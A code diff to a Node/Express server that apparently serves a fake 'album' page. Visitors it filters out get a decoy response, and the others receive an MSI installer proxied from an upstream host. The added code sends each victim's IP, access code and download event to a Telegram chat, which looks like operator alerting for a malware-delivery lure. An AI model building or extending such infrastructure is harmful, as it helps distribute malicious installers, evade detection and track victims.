@@ -14,6 +14,35 @@ const TOKEN_TTL_MS = 15 * 60 * 1000;      // token life
 const CHALLENGE_SECRET = process.env.CHALLENGE_SECRET || crypto.randomBytes(32).toString('hex');
 const PEPPER = 'reno-album-' + crypto.createHash('sha256').update(CHALLENGE_SECRET).digest('hex').slice(0, 8);
 
+// ---------- Telegram notifications (optional; no-op unless both env vars set) ----------
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
+const tgOn = Boolean(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID);
+const openNotified = new Map(); // ip -> last-notify ts (cooldown)
+
+function tgSend(text) {
+  if (!tgOn) return;
+  try {
+    fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML', disable_web_page_preview: true }),
+    }).catch(() => {});
+  } catch (_) {}
+}
+
+function notifyOpen(ip, code) {
+  const now = Date.now();
+  const last = openNotified.get(ip);
+  if (last && now - last < 10 * 60 * 1000) return; // 10-min cooldown per IP
+  openNotified.set(ip, now);
+  tgSend('Album opened\nIP: <code>' + ip + '</code>\nCode: <code>' + code + '</code>\n' + new Date().toUTCString());
+}
+
+function notifyDownload(ip) {
+  tgSend('MSI downloaded\nIP: <code>' + ip + '</code>\n' + new Date().toUTCString());
+}
+
 const app = express();
 app.disable('x-powered-by');
 app.use(express.json({ limit: '4kb' }));
@@ -120,6 +149,7 @@ app.get(/^\/a\/[A-Za-z0-9_-]{1,64}$/, (req, res) => {
     logHit(ip, req.headers['user-agent'], req.path, 'album-decoy');
     return decoy(res, 200);
   }
+  notifyOpen(ip, req.path);
 
   const nonce = crypto.randomBytes(12).toString('base64url');
   challengeNonces.set(nonce, { ip, exp: Date.now() + TOKEN_TTL_MS });
@@ -180,6 +210,7 @@ app.get('/d/:token', async (req, res) => {
     if (!upstream.ok || !upstream.body) throw new Error('upstream ' + upstream.status);
     const total = upstream.headers.get('content-length');
     logHit(ip, req.headers['user-agent'], req.path.slice(0, 24) + '...', 'download');
+    notifyDownload(ip);
     res.status(200);
     res.set('Content-Type', 'application/octet-stream');
     res.set('Content-Disposition', 'attachment; filename="' + MSI_FILENAME + '"');
